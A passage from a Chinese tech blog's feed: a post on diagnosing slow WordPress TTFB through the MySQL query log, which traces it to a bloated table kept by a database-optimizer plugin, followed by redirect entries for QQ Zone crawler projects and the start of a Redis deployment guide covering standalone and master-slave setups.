        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近发现打开网站的响应时间变得很长，在浏览器通过F12打开控制台发现TTFB高达6秒。</p><p>而且经测试发现，不仅站点<strong>所有页面</strong>打开时的TTFB都需要6秒，连打开<strong>站点后台</strong>的TTFB也是固定6秒。</p><p><img src="./01.png"></p><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>首先简单解析下，什么是TTFB？</p><p>TTFB (Time To First Byte)，是最初的网络请求被发起到从服务器接收到第一个字节这段时间，它包含了TCP连接时间，发送HTTP请求时间和获得响应消息第一个字节的时间。</p><h2 id="推测"><a href="#推测" class="headerlink" title="推测"></a>推测</h2><p>查询很多处理TTFB过慢文章，很多都是说减少DNS、使用CDN、提高服务器性能、甚至还与各个地区访问服务器的延迟状态等等方法。</p><p>但是经过初步测试，我判断并不是上面的原因引起的，这是因为：</p><ul><li>直接通过IP访问站点（即跳过DNS解析），TTFB依旧是6秒</li><li>把站点展示的内容（图文数据）完全克隆到另一台测试服务器（性能比正式服务器低），TTFB只有不到1秒</li><li>我的测试服务器和正式服务器是同一地区的，而测试服能达到秒级响应，说明不是地域问题</li></ul><p>但有个地方引起我的关注：</p><blockquote><p>正式服务器前后台的TTFB均是6秒，克隆内容后的测试服务器TTFB不到1秒</p></blockquote><p>因此我初步分析，很有可能在我打开站点的时候，<strong>站点做了某个行为</strong>，这个行为不论在我打开站点前台还是后台都会触发的，而这个行为跟我站点的展示内容无关。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么如何定位到这个行为是什么就是关键了。</p><p>考虑到TTFB的特点，这个行为要么发生在“TCP连接时间”，要么发生在“发送HTTP请求时间和获得响应消息第一个字节的时间”。但是发现站点的ping延迟并不高，因此嫌疑最重的就是后者。</p><p>但是就一般而言，站点收到HTTP请求并不会执行什么特殊操作，但是为了展示界面，一定会做的就是<strong>数据库访问</strong>，因此为了进一步定位是否为数据库导致的，<font color="red">我需要知道在访问网站的同时，站点执行了哪些SQL，每条SQL耗时多长</font>。</p><p>为此，查看<strong>数据库日志</strong>是最直接的。</p><p>一般情况下，WP使用的是 mysql/mariadb ，数据库日志默认是关闭的，因此需要先激活日志功能：</p><p>使用root用户登陆到数据库后，检查“数据库日志”是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> general_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> general_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>所有SQL操作</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> general_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外，还有一个相关的“慢查询日志”，检查是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> slow_query_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> slow_query_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token operator">-</span>slow<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>执行时间超过一定数值的SQL</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> slow_query_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>无需重启数据库，直接刷新站点，发现 <code>VM_211_224_centos.log</code> 日志有内容，<code>VM_211_224_centos-slow.log</code>日志无内容（当然这是针对我的情况而言，mysql/mariadb默认超过10秒的SQL才是慢查询，后者没日志很可能就是因为并不存在这类SQL）。</p><p>虽然 <code>VM_211_224_centos.log</code> 日志有内容，但也仅仅是一股脑把所有SQL列印出来而已，并不能反映每条SQL的执行时长。</p><p>但是这里可以<font color="red">通过<code>tail -f</code>实时直播日志的打印</font>，以判断执行哪些SQL时会有停顿：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tail</span> -10f /var/lib/mysql/VM_211_224_centos.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./02.png"></p><p>刷新网站后，发现日志只在这个SQL执行的时候出现卡顿：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> meta_value <span class="token keyword">FROM</span> wp_clean_up_optimizer_meta <span class="token keyword">WHERE</span> meta_key<span class="token operator">=</span><span class="token string">'other_settings'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我马上就发现，<code>wp_clean_up_optimizer_meta</code>这张表是属于之前安装的数据库优化插件【Clean Up Optimizer】的。检查这张表的数据，存储了约4000条<code>recent_login_data</code>，而<font color="red">这些数据记录的是近期发生过的登陆行为</font>，且含有不少长文本：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> wp_clean_up_optimizer_meta <span class="token keyword">where</span> meta_key <span class="token operator">=</span> <span class="token string">'recent_login_data'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查插件【Clean Up Optimizer】，确实<strong>有记录近期尝试登陆的用户信息</strong>的功能，且这个功能无法关闭。</p><p>而我相信任何一个作为WP的站长，都很清楚<strong>每天被大量机器人尝试登陆自己的站点</strong>已经不是什么鲜为人知的秘密。</p><p>为此带来的问题就是<code>wp_clean_up_optimizer_meta</code>表会因为这些<strong>无效登陆</strong>而<strong>日益膨胀</strong>。</p><p>虽然我不清楚这个插件有什么理由需要在每次打开站点页面时都去查询这张表，但是任由这张表去膨胀而不加约束、甚至不提供功能开关、还不加索引查询，都是很蠢的行为，而<strong>这正是导致这一系列问题的元凶</strong>。</p><p>于是，<font color="red">我停用了这个插件，现在打开任意页面，TTFB都降低到秒级了</font>。</p><p><img src="./03.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>需知道，每个站点TTFB变慢都可能有其特殊原因，并不能一概而论地去烦恼DNS、CDN等问题。</p><p>文本只是根据我的经验，提供一个排查思路，仅供参考。</p><p>最后，我给这个插件的作者发了一封邮件，这个事情就这么解决了。</p><p>但是讽刺的是，作为一个数据库优化的插件，却因为数据库的问题成为了网站访问延迟的元凶，看来我们也不能太过依赖一些便利的工具了。但我又转念一想，杀软和病毒，也不恰恰正是因为这种相互依赖关系才得以共存么？呵。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> TTFB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ 空间爬虫（Python 版）</title>
      <link href="/crawler/pyzone-crawler/"/>
      <url>/crawler/pyzone-crawler/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/pyzone-crawler/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/pyzone-crawler/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/pyzone-crawler/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ 空间爬虫（Java 版）</title>
      <link href="/crawler/jzone-crawler/"/>
      <url>/crawler/jzone-crawler/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/jzone-crawler/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/jzone-crawler/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/jzone-crawler/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 部署笔记（单机 + 主从 + 哨兵 + 集群）</title>
      <link href="/db/redis-bu-shu-bi-ji/"/>
      <url>/db/redis-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Redis是一个开源，高级的键值存储和一个适用的解决方案，用于构建高性能，可扩展的Web应用程序。它有三个主要特点，使其优越于其它键值数据存储系统：</p><ul><li>Redis将其数据库完全保存在内存中，仅使用磁盘进行持久化。</li><li>与其它键值数据存储相比，Redis有一组相对丰富的数据类型。</li><li>Redis可以将数据复制到任意数量的从机中。</li></ul><h2 id="2-部署声明"><a href="#2-部署声明" class="headerlink" title="2. 部署声明"></a>2. 部署声明</h2><p>本文基于<font color="red">Centos7系统</font>，由浅入深讲解如何部署Redis的<strong>四种模式</strong>，分别是：<strong>单机模式、主从模式、哨兵模式、集群模式</strong>。</p><p>需注意，这里<strong>因为只用于教学演示</strong>，所以<strong>这四种模式都是部署在同一台Centos机器上的</strong>（通过不同的服务端口区分不同的Redis实例）。实际使用时，一般会使用多台机器部署，此时只需要对应修改IP即可，部署过程是一样的。</p><h2 id="3-前置环境部署"><a href="#3-前置环境部署" class="headerlink" title="3. 前置环境部署"></a>3. 前置环境部署</h2><p>如果只是部署Redis【单机模式/主从模式/哨兵模式】，是不需要安装这个前置环境的。</p><p>如果要部署Redis【集群模式（Redis Cluster）】，建议先装完这个前置环境才往下阅读。</p><p>这是因为Redis Cluster需要使用ruby脚本构建。虽然Centos7自带了ruby支持库的安装源，但是版本过低（只是2.0.0版本），<strong>Redis要求ruby的版本至少为2.2.2</strong>。安装方法如下：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> centos-release-scl-rh　　　　　<span class="token comment" spellcheck="true"># 会在/etc/yum.repos.d/目录多出一个CentOS-SCLo-scl-rh.repo源</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先更换yum源安装2.3版本的ruby：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> rh-ruby23 -yscl <span class="token function">enable</span> rh-ruby23 <span class="token function">bash</span>　　　　　<span class="token comment" spellcheck="true"># 临时变更当前环境变量的ruby版本为2.3（重启后失效）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>这种安装方式是使得ruby2.0和2.3版本并存，并非升级ruby。 之后若要再使用2.3版本的ruby，需再次执行<code>scl enable rh-ruby23 bash</code>命令。</p></blockquote><p>查看ruby版本：</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -v<span class="token comment" spellcheck="true"># ruby 2.3.6p384 (2017-12-14 revision 61254) [x86_64-linux]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装gem：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> rubygems -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装ruby的redis包（用于redis通讯）：</p><pre class="line-numbers language-bash"><code class="language-bash">gem <span class="token function">install</span> redis<span class="token comment" spellcheck="true"># 若前面安装ruby版本过低就会报错：</span><span class="token comment" spellcheck="true"># ERROR:  Error installing redis:</span><span class="token comment" spellcheck="true">#         redis requires Ruby version >= 2.2.2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看gem版本：</p><pre class="line-numbers language-bash"><code class="language-bash">gem -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font color="red">至此前置环境就安装完成了，下面开始讲述Redis四种模式的部署。</font></p><h2 id="4-单机模式"><a href="#4-单机模式" class="headerlink" title="4. 单机模式"></a>4. 单机模式</h2><h3 id="4-1-简介"><a href="#4-1-简介" class="headerlink" title="4.1. 简介"></a>4.1. 简介</h3><p>单机模式是Redis最基本的模式，之后的主从、哨兵、集群模式都是据此扩展而来。而且在开发环境下，出于方便起见，一般部署单机模式即可满足调试要求。</p><h3 id="4-2-安装"><a href="#4-2-安装" class="headerlink" title="4.2. 安装"></a>4.2. 安装</h3><p>到官网下载最新版，本文下载的版本是<font color="red">redis-4.0.10.tar.gz</font> ：</p><blockquote><p>中文官网：<a href="http://www.redis.cn/">http://www.redis.cn/</a><br>英文官网（需翻墙）：<a href="https://redis.io/">https://redis.io/</a></p></blockquote><p>上传到Centos服务器，本文上传位置为：</p><blockquote><p><font color="red">/usr/local</font>/redis-4.0.10.tar.gz</p></blockquote><p>解压安装包：</p><blockquote><p>tar -zxvf redis-4.0.10.tar.gz</p></blockquote><p>由于Redis需要编译安装，先安装gcc编译环境：</p><blockquote><p>yum install gcc</p></blockquote><p>进入Redis安装目录：</p><blockquote><p>cd <font color="red">/usr/local/redis-4.0.10/</font></p></blockquote><p>编译：</p><blockquote><p>make MALLOC=libc</p></blockquote><p>编译完成后，进入src目录：</p><blockquote><p>cd /usr/local/redis-4.0.10/src/</p></blockquote><p>把 src 目录下的文件安装到 /usr/local/bin ：</p><blockquote><p>make install</p></blockquote><h3 id="4-3-部署"><a href="#4-3-部署" class="headerlink" title="4.3. 部署"></a>4.3. 部署</h3><p>默认情况下，Redis是通过以下方式启动/停止的：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/　　<span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf　　　　<span class="token comment" spellcheck="true"># 启动Redis</span>Ctrl + C　　　　　　　　　　　　　　　　<span class="token comment" spellcheck="true"># 停止Redis</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这种启动方式非但无法在后台运行，而且也不符合使用习惯。<br>另外默认情况下Redis也不直接支持开机自启，为此要对其进行改造。</p><p>通过命令<code>vi /usr/local/redis-4.0.10/redis.conf</code>编辑Redis配置文件，为支持后台启动：</p><pre class="line-numbers language-bash"><code class="language-bash">daemonize <span class="token function">yes</span>　　　　　　<span class="token comment" spellcheck="true"># 后台启动模式</span><span class="token comment" spellcheck="true"># 顺便修改一下其他配置项</span>maxmemory 536870912　　<span class="token comment" spellcheck="true"># 最大内存（单位byte），需根据实际配置，建议为当前空闲内存的50%左右</span><span class="token function">dir</span> /tmp/redis　　　　　<span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），默认值为[./]，logfile与dbfilename受其影响</span>logfile <span class="token string">"6379.log"</span>　　　　<span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump.rdb　　<span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 单机模式配置redis.conf下载：<a href="https://share.weiyun.com/5ZhIKTe">https://share.weiyun.com/5ZhIKTe</a> 密码：nppwyt ●</p></blockquote><p>新建上面配置的Redis工作目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /tmp/redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在/etc目录下新建redis目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拷贝redis.conf配置文件到/etc/redis目录下，并<font color="red">重命名为6379.conf</font>（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此若redis的端口号改了，这个文件名也要修改）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拷贝Redis的启动脚本到/etc/init.d目录下，并<font color="red">重命名为redisd</font>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过<code>vi /etc/init.d/redisd</code>命令修改redisd文件，在首行<code>#!/bin/sh</code>下面添加两行（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment" spellcheck="true"># chkconfig:   2345 90 10</span><span class="token comment" spellcheck="true"># description:  Redis is a persistent key-value database</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切换到/etc/init.d目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置为开机自启：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> redisd on　　　<span class="token comment" spellcheck="true"># 若不需要自启则执行 chkconfig redisd off</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在可以直接以服务的形式启动Redis了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> redisd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-测试"><a href="#4-4-测试" class="headerlink" title="4.4. 测试"></a>4.4. 测试</h3><p>然后通过Redis测试客户端命令<code>redis-cli</code>连接到Redis实例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/         <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-cli -h 127.0.0.1 -p 6379        <span class="token comment" spellcheck="true"># 连接到Redis</span>172.168.10.63:6379<span class="token operator">></span> info                <span class="token comment" spellcheck="true"># 查看Redis信息</span><span class="token comment" spellcheck="true"># Server</span>redis_version:4.0.10redis_git_sha1:00000000redis_git_dirty:0redis_build_id:a5e228e715215d35redis_mode:standaloneos:Linux 2.6.32-358.el6.x86_64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:sync-builtingcc_version:4.4.7process_id:26027run_id:d5f3dd33bb6b52f9b82927992251e21b3a68432etcp_port:6379uptime_in_seconds:1806685uptime_in_days:20hz:10lru_clock:9988483executable:/usr/local/bin/redis-serverconfig_file:/etc/redis/6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="red">至此Redis单机模式部署完成。</font></p><p>为了开始下一阶段部署，现在先停止这个Redis进程：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> redisd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-主从模式"><a href="#5-主从模式" class="headerlink" title="5. 主从模式"></a>5. 主从模式</h2><h3 id="5-1-简介"><a href="#5-1-简介" class="headerlink" title="5.1. 简介"></a>5.1. 简介</h3><p>在实际生产环境下，Redis基本上是不可能部署成单机模式的。一般都需要部署Redis集群实现高可用，以保障业务的稳定运行。</p><p>要学会部署Redis集群，那就先从Redis集群中最简单的<strong>主从模式</strong>说起。</p><p>在一些简单小型的应用中，我们可能会看到类似于下图的Redis部署架构。其中Master是主机，Slave是从机，而这种架构方式就是所谓的<strong>一主多从</strong>：</p><p><img src="./01.png"></p><p>在这种架构模式下，主机和从机的数据完全一致，主机支持数据的写入和读取等各项操作，而从机则只支持与主机数据的同步和读取。也就是说，客户端可以将数据写入到主机，由主机自动将数据的写入操作同步到从机。</p><p><strong>主从模式很好的解决了数据备份问题</strong>，并且由于主从服务数据几乎是一致的，因而可以将写入数据的命令发送给主机执行，而读取数据的命令发送给不同的从机执行，从而达到读写分离的目的。</p><h3 id="5-2-部署"><a href="#5-2-部署" class="headerlink" title="5.2. 部署"></a>5.2. 部署</h3><p>下面演示如何部署一个一主三从的<strong>主从模式</strong>。</p><p>为了区分单机模式的部署位置，这里拷贝一下Redis的目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -r /usr/local/redis-4.0.10 /usr/local/redis-ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下文会基于<code>于/usr/local/redis-ms</code>目录部署主从模式。</p><p>由于每个Redis实例都是一个单独的进程，所以需要在每个Redis实例启动时为其分配一个独立的配置文件就能使他们区分开来（同时由于本文是部署在同一台机器，需为每个实例指定不同的服务端口）。</p><p>为了在同一台机器上部署一主三从的Redis，准备以下四份配置文件：</p><table><thead><tr><th align="center">角色</th><th align="center">配置文件</th><th align="center">服务端口</th></tr></thead><tbody><tr><td align="center">主机</td><td align="center">redis-6379.conf</td><td align="center">6379</td></tr><tr><td align="center">从机</td><td align="center">redis-6380.conf</td><td align="center">6380</td></tr><tr><td align="center">从机</td><td align="center">redis-6381.conf</td><td align="center">6381</td></tr><tr><td align="center">从机</td><td align="center">redis-6382.conf</td><td align="center">6382</td></tr></tbody></table><blockquote><p>这四份配置文件均拷贝自 <code>/usr/local/redis-ms/redis.conf</code> ，拷贝到 <code>/usr/local/redis-ms/</code> 目录再修改即可。</p></blockquote><p>主机redis-<font color="red">6379</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6379daemonize <span class="token function">yes</span>pidfile /var/run/redis_6379.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6379.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6379.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6379.conf下载：<a href="https://share.weiyun.com/5JOX4Nd">https://share.weiyun.com/5JOX4Nd</a> 密码：qdcfie ●</p></blockquote><p>从机redis-<font color="blue">6380</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6380daemonize <span class="token function">yes</span>pidfile /var/run/redis_6380.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6380.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6380.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>slaveof 127.0.0.1 6379    <span class="token comment" spellcheck="true"># 标注所从属的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6380.conf下载：<a href="https://share.weiyun.com/5SCapFt">https://share.weiyun.com/5SCapFt</a> 密码：4sibg2 ●</p></blockquote><p>从机redis-<font color="blue">6381</font>.conf配置文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">bind 127.0.0.1            <span class="token comment" spellcheck="true"># 正式部署请设为合适的IP</span>port 6381daemonize <span class="token function">yes</span>pidfile /var/run/redis_6381.pid<span class="token function">dir</span> /tmp/redis-ms         <span class="token comment" spellcheck="true"># Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响</span>logfile <span class="token string">"6381.log"</span>        <span class="token comment" spellcheck="true"># Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称</span>dbfilename dump-6381.rdb  <span class="token comment" spellcheck="true"># Redis数据持久化时的存储位置，正式部署请设置为合适的名称</span>slaveof 127.0.0.1 6379    <span class="token comment" spellcheck="true"># 标注所从属的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>● 主从模式配置redis-6381.conf下载：<a href="https://share.weiyun.com/5pZ7hup">https://share.weiyun.com/5pZ7hup</a> 密码：jiw8gm ●</p></blockquote><p>从机redis-<font color="blue">6382<